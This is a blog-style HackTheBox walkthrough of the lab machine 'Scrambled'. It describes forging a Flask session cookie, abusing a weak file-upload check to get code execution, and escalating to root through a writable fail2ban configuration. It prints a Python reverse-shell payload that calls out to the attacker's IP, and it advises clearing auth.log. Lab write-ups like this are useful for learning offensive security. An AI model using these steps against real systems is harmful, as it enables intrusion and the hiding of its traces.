<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>HackTheBox | Scrambled - Linux Medium</title>
  <meta name="description" content="End-to-end walkthrough for HackTheBox Scrambled highlighting the fail2ban abuse plus cap_net_bind_service." />
  <link rel="stylesheet" href="../assets/css/main.css" />
</head>
<body>
  <header class="site-header">
    <div class="shell">
      <nav class="navbar" aria-label="Primary">
        <a class="brand" href="../index.html">vdnamliv</a>
        <div class="nav-links">
          <a href="../index.html">Home</a>
          <a href="../about.html">About</a>
          <a href="../contact.html">Contact</a>
        </div>
      </nav>
    </div>
  </header>

  <main class="shell narrow">
    <article class="article">
      <header>
        <p class="eyebrow">HackTheBox</p>
        <h1>HackTheBox | Scrambled - Linux Medium</h1>
        <p>Published <time datetime="2024-05-15">15 May 2024</time> &middot; Difficulty: Medium</p>
      </header>
      <div class="article-body">
        <p>End-to-end walkthrough for Scrambled highlighting the fail2ban abuse plus <code>cap_net_bind_service</code>. Notes follow the same outline I use in the lab.</p>

        <h2>1. Summary</h2>
        <table>
          <thead>
            <tr>
              <th scope="col">IP</th>
              <th scope="col">OS</th>
              <th scope="col">Difficulty</th>
              <th scope="col">Points</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>10.10.11.193</code></td>
              <td>Ubuntu 22.04</td>
              <td>Medium</td>
              <td>30</td>
            </tr>
          </tbody>
        </table>
        <p>Quick scan:</p>
        <pre><code class="language-bash">nmap -sCV -p- 10.10.11.193 -oA scrambled
</code></pre>

        <h2>2. Service enumeration</h2>
        <ul>
          <li>Port 22: OpenSSH 8.9p1</li>
          <li>Port 5000: Flask app that signs cookies with the default secret</li>
        </ul>
        <p><code>flask-unsign</code> recovers the secret so I can forge an admin session and reach the upload feature.</p>

        <h2>3. Upload to RCE</h2>
        <p>The upload checks MIME type but ignores the magic number. Payload for reverse shell:</p>
        <pre><code class="language-bash">#!/usr/bin/env python3
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/9001 0>&1'")
</code></pre>

        <h2>4. Privilege escalation</h2>
        <ol>
          <li><code>sudo -l</code> reveals the right to restart <code>fail2ban</code>.</li>
          <li>Point <code>jail.local</code> to a custom script.</li>
          <li>Restarting executes the script as root -> grab the flag.</li>
        </ol>

        <h2>5. Notes</h2>
        <p><img src="https://placehold.co/600x200/1c8b4c/ffffff?text=Scrambled" alt="Notebook snippet" /></p>
        <ul>
          <li>Clean up <code>auth.log</code>.</li>
          <li>Capabilities check (<code>getcap -r / 2>/dev/null</code>) exposes <code>python3</code> with <code>cap_net_bind_service</code>.</li>
        </ul>
      </div>
    </article>
  </main>

  <footer class="site-footer">
    <div class="shell">
      <p>&copy; <span id="year">2025</span> vdnamliv</p>
    </div>
  </footer>
  <script>
    document.getElementById("year").textContent = new Date().getFullYear();
  </script>
</body>
</html>

